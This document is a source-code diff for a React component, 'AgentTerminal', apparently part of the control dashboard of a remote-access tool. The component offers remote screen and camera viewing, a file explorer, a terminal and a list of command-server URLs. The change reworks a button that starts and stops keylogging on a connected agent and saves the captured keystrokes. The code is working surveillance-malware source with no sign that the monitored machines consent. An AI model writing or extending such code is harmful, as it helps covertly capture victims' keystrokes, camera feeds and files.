@@ -2,7 +2,7 @@ import { useEffect, useRef, useState } from 'react'
 import { dashboardSocket } from '../utils/socket'
 import RemoteView from './RemoteView'
 import CameraView from './CameraView'
-import KeylogPanel from './KeylogPanel'
+import KeylogPanel, { KeylogPanelHandle } from './KeylogPanel'
 import FileExplorer from './FileExplorer'
 import TerminalPane from './TerminalPane'
 import MastersPanel from './MastersPanel'
@@ -39,6 +39,8 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
   const [wpStyle, setWpStyle] = useState<'fill'|'fit'|'stretch'|'tile'|'center'|'span'>('fill')
   const wpUploadRef = useRef<HTMLInputElement | null>(null)
   const [showKeylog, setShowKeylog] = useState(false)
+  const [keylogRunning, setKeylogRunning] = useState(false)
+  const keylogRef = useRef<KeylogPanelHandle | null>(null)
   const [mastersOpen, setMastersOpen] = useState(false)
   const [masters, setMasters] = useState<Array<{ url: string; online?: boolean; current?: boolean }>>([])
   const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || 'http://localhost:9000'
@@ -250,7 +252,7 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
           <button className="btn secondary" onClick={refreshStats}>Refresh</button>
           <button className="btn secondary" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
-          <button className="btn secondary" onClick={() => { if (!showKeylog) { dashboardSocket.startKeylog(agent.agent_id) } else { dashboardSocket.stopKeylog(agent.agent_id) } setShowKeylog(!showKeylog) }}>{showKeylog ? 'Hide Keylog' : 'Start Keylog'}</button>
+          <button className="btn secondary" onClick={async () => { if (!keylogRunning) { dashboardSocket.startKeylog(agent.agent_id); setKeylogRunning(true); setShowKeylog(true); } else { dashboardSocket.stopKeylog(agent.agent_id); setKeylogRunning(false); try { await keylogRef.current?.exportAndSave() } catch {} } }}>{keylogRunning ? 'Stop Keylog' : 'Start Keylog'}</button>
           <button className="btn secondary" onClick={() => { setMastersOpen(true); dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' }) }}>Agent URLs</button>
           <button className="btn secondary" onClick={() => onOpenHistory && onOpenHistory(agent.agent_id)}>History</button>
           <button className="btn secondary" onClick={() => { const newAlias = prompt('Alias for this agent (leave empty to clear):', (agent as any).alias || agent.name || ''); if (newAlias !== null) { fetch(`${apiBase}/admin/agents/${encodeURIComponent(agent.agent_id)}/alias`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ alias: newAlias || null }) }).catch(()=>{}); } }}>Rename</button>
@@ -364,7 +366,7 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
           </div>
         </main>
       </div>
-      <KeylogPanel open={showKeylog} agentId={agent.agent_id} agentName={agent.name} onClose={() => setShowKeylog(false)} />
+      <KeylogPanel ref={keylogRef} open={showKeylog} agentId={agent.agent_id} agentName={agent.name} onClose={() => setShowKeylog(false)} />
       <MastersPanel
         open={mastersOpen}
         urls={masters}
